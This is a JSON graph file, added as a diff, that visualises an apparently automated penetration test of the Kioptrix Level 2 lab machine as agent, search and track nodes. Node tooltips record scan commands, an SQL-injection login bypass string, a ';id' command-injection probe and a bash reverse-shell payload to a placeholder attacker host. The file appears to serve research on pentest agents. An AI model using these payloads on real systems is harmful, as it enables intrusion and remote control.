@@ -1,0 +1,616 @@
+{
+  "paper_analogy": "Deep Reinforcement Learning on Graphs for Autonomous Search-and-Track",
+  "machine": "Kioptrix Level 2",
+  "source": "training_data.csv, Machine == 'Kioptrix Level 2', 8 row(s), 1 auto-detected run(s)/playthroughs. Graph built directly from the PTT (Penetration Testing Tree) field's growth.",
+  "analogy_mapping": {
+    "Agent Nodes": "PTT snapshot reached after each new tree item (state = cumulative tree)",
+    "Search Nodes": "The PTT tree item worked on (number + title) + its MCP_tasks tool calls",
+    "Track Nodes": "That item's findings payload -- what was actually discovered"
+  },
+  "legend": {
+    "node_types": {
+      "Agent (Blue/Pink goal)": "PTT state after a new item completes",
+      "Search (Orange)": "PTT item being worked (tool calls in tooltip)",
+      "Track (Green)": "Findings payload of that item"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "Agent -> Agent, label = PTT item number",
+      "SearchUpdate (Green)": "Agent -> Search, item being worked from that state",
+      "TrackUpdate (Blue)": "Search -> Track, what item's execution found",
+      "Prediction (Purple)": "Track -> Agent, leads to next cumulative PTT state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "agent:Kioptrix Level 2:START",
+      "label": "Agent: Initial\n(Start)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Start of pentest against 'Kioptrix Level 2'. 1 recorded run(s) below.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Kioptrix Level 2:r1_s1_2.1",
+      "label": "Search: 2.1\nPort scanning",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 2.1: Port scanning\n\nMCP tool calls:\nNmap: Execute netdiscover scan to locate target machine IP address on local network",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Kioptrix Level 2:r1_s1_2.1",
+      "label": "Track: Port scanning",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "2.1 Port scanning:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Kioptrix Level 2:r1_s1_2.1",
+      "label": "Agent: 2.1\nEnumeration",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 2.1:\n\u2713 1 Reconnaissance\n\u2026 2 Enumeration\n  \u25cb 2.1 Port scanning\n\u25cb 3 Initial Access\n\u25cb 4 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Kioptrix Level 2:r1_s2_3.1",
+      "label": "Search: 3.1\nWeb application testing",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 3.1: Web application testing\n\nMCP tool calls:\nNmap: Execute nmap -A 192.168.1.111 to perform comprehensive port scan with service version detection and OS fingerprinting",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Kioptrix Level 2:r1_s2_3.1",
+      "label": "Track: Web application testing",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "3.1 Web application testing:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Kioptrix Level 2:r1_s2_3.1",
+      "label": "Agent: 3.1\nInitial Access",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 3.1:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2026 3 Initial Access\n  \u25cb 3.1 Web application testing\n\u25cb 4 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Kioptrix Level 2:r1_s3_3.2",
+      "label": "Search: 3.2\nCommand injection",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 3.2: Command injection\n\nMCP tool calls:\nWeb page interaction: Test SQL injection payload username 1' or '1' and password 1' or '1' to bypass authentication; SQLmap: Optionally use automated SQL injection tool if manual injection unsuccessful",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Kioptrix Level 2:r1_s3_3.2",
+      "label": "Track: Command injection",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "3.2 Command injection:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Kioptrix Level 2:r1_s3_3.2",
+      "label": "Agent: 3.2\nInitial Access",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 3.2:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2026 3 Initial Access\n  \u2713 3.1 Web application testing\n  \u25cb 3.2 Command injection\n\u25cb 4 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Kioptrix Level 2:r1_s4_3.3",
+      "label": "Search: 3.3\nReverse shell",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 3.3: Reverse shell\n\nMCP tool calls:\nWeb page interaction: Submit ;id command in input field to test command injection vulnerability and identify current user context",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Kioptrix Level 2:r1_s4_3.3",
+      "label": "Track: Reverse shell",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "3.3 Reverse shell:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Kioptrix Level 2:r1_s4_3.3",
+      "label": "Agent: 3.3\nInitial Access",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 3.3:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2026 3 Initial Access\n  \u2713 3.1 Web application testing\n  \u2713 3.2 Command injection\n  \u25cb 3.3 Reverse shell\n\u25cb 4 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Kioptrix Level 2:r1_s5_4.1",
+      "label": "Search: 4.1\nKernel exploit research",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4.1: Kernel exploit research\n\nMCP tool calls:\nNetcat: Setup listener on attacker machine port 8888; Web page interaction: Submit payload 127.0.0.1; bash -i >& /dev/tcp/attacker_ip/8888 0>&1 to establish reverse shell connection",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Kioptrix Level 2:r1_s5_4.1",
+      "label": "Track: Kernel exploit research",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4.1 Kernel exploit research:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Kioptrix Level 2:r1_s5_4.1",
+      "label": "Agent: 4.1\nPrivilege Escalation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4.1:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2713 3 Initial Access\n\u2026 4 Privilege Escalation\n  \u25cb 4.1 Kernel exploit research",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Kioptrix Level 2:r1_s6_4.2",
+      "label": "Search: 4.2\nExploit compilation",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4.2: Exploit compilation\n\nMCP tool calls:\nInteractive CLI: Execute uname -r to identify kernel version; Interactive CLI: Execute searchsploit linux kernel 2.6 to locate privilege escalation exploits; Google search: Search for Linux kernel 2.6 privilege escalation CVE",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Kioptrix Level 2:r1_s6_4.2",
+      "label": "Track: Exploit compilation",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4.2 Exploit compilation:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Kioptrix Level 2:r1_s6_4.2",
+      "label": "Agent: 4.2\nPrivilege Escalation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4.2:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2713 3 Initial Access\n\u2026 4 Privilege Escalation\n  \u2713 4.1 Kernel exploit research\n  \u25cb 4.2 Exploit compilation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Kioptrix Level 2:r1_close",
+      "label": "Agent: Task\nComplete (Goal)",
+      "type": "Agent",
+      "color": "#FF006E",
+      "title": "Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n\u2713 2 Enumeration\n\u2713 3 Initial Access\n\u2713 4 Privilege Escalation",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "agent:Kioptrix Level 2:START",
+      "to": "agent:Kioptrix Level 2:r1_s1_2.1",
+      "label": "\u2192 2.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:START",
+      "to": "search:Kioptrix Level 2:r1_s1_2.1",
+      "label": "2.1 Port scanning",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Kioptrix Level 2:r1_s1_2.1",
+      "to": "track:Kioptrix Level 2:r1_s1_2.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Kioptrix Level 2:r1_s1_2.1",
+      "to": "agent:Kioptrix Level 2:r1_s1_2.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s1_2.1",
+      "to": "agent:Kioptrix Level 2:r1_s2_3.1",
+      "label": "\u2192 3.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s1_2.1",
+      "to": "search:Kioptrix Level 2:r1_s2_3.1",
+      "label": "3.1 Web application tes\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Kioptrix Level 2:r1_s2_3.1",
+      "to": "track:Kioptrix Level 2:r1_s2_3.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Kioptrix Level 2:r1_s2_3.1",
+      "to": "agent:Kioptrix Level 2:r1_s2_3.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s2_3.1",
+      "to": "agent:Kioptrix Level 2:r1_s3_3.2",
+      "label": "\u2192 3.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s2_3.1",
+      "to": "search:Kioptrix Level 2:r1_s3_3.2",
+      "label": "3.2 Command injection",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Kioptrix Level 2:r1_s3_3.2",
+      "to": "track:Kioptrix Level 2:r1_s3_3.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Kioptrix Level 2:r1_s3_3.2",
+      "to": "agent:Kioptrix Level 2:r1_s3_3.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s3_3.2",
+      "to": "agent:Kioptrix Level 2:r1_s4_3.3",
+      "label": "\u2192 3.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s3_3.2",
+      "to": "search:Kioptrix Level 2:r1_s4_3.3",
+      "label": "3.3 Reverse shell",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Kioptrix Level 2:r1_s4_3.3",
+      "to": "track:Kioptrix Level 2:r1_s4_3.3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Kioptrix Level 2:r1_s4_3.3",
+      "to": "agent:Kioptrix Level 2:r1_s4_3.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s4_3.3",
+      "to": "agent:Kioptrix Level 2:r1_s5_4.1",
+      "label": "\u2192 4.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s4_3.3",
+      "to": "search:Kioptrix Level 2:r1_s5_4.1",
+      "label": "4.1 Kernel exploit rese\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Kioptrix Level 2:r1_s5_4.1",
+      "to": "track:Kioptrix Level 2:r1_s5_4.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Kioptrix Level 2:r1_s5_4.1",
+      "to": "agent:Kioptrix Level 2:r1_s5_4.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s5_4.1",
+      "to": "agent:Kioptrix Level 2:r1_s6_4.2",
+      "label": "\u2192 4.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s5_4.1",
+      "to": "search:Kioptrix Level 2:r1_s6_4.2",
+      "label": "4.2 Exploit compilation",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Kioptrix Level 2:r1_s6_4.2",
+      "to": "track:Kioptrix Level 2:r1_s6_4.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Kioptrix Level 2:r1_s6_4.2",
+      "to": "agent:Kioptrix Level 2:r1_s6_4.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Kioptrix Level 2:r1_s6_4.2",
+      "to": "agent:Kioptrix Level 2:r1_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 20,
+    "total_edges": 25,
+    "agent_nodes": 8,
+    "search_nodes": 6,
+    "track_nodes": 6,
+    "runs_detected": 1,
+    "rows_captured": 8
+  }
+}
